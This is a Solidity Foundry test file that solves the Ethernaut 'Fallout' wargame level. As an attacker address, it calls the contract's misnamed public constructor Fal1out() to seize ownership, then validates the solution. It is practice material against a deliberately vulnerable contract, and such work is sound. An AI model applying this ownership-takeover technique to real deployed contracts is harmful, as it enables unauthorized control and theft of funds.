// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {IFallout} from "src/hack/interfaces/IFallout.sol";
import {Level as FalloutFactory} from "src/levels/base/Level.sol";

contract FalloutTest is Test {
    IFallout private fallout;
    FalloutFactory private falloutFactory;
    address private attacker = makeAddr("attacker");

    function setUp() public {
        // At the time of writing, Foundry does not support contract compilation if one of the contracts involved uses an older version of Solidity.
        // Hence, we deploy the contract using compiler generated creation code

        // Deploy FalloutFactory
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("FalloutFactory.sol")
        );
        address falloutFactoryAddress;
        // This is the address at which runtime code is set, which will be executed on the chain.
        assembly {
            falloutFactoryAddress := create(
                0,
                add(bytecode, 0x20),
                mload(bytecode)
            )
        }

        // Load FalloutFactory contract instance using interface
        falloutFactory = FalloutFactory(falloutFactoryAddress);

        // Deploy Fallout
        bytecode = abi.encodePacked(vm.getCode("Fallout.sol"));
        address falloutAddress;
        assembly {
            falloutAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        fallout = IFallout(payable(falloutFactory.createInstance(attacker)));
    }

    function test_FalloutContract() external {
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);

        // Call Fal1out() function
        // this will set attacker as the new owner
        fallout.Fal1out();

        address newOwner = fallout.owner();
        assertEq(newOwner, attacker, "New owner not set. Attack failed.");

        // Verify solution using Ethernaut validation
        falloutFactory.validateInstance(payable(address(fallout)), attacker);
        vm.stopPrank();
    }
}
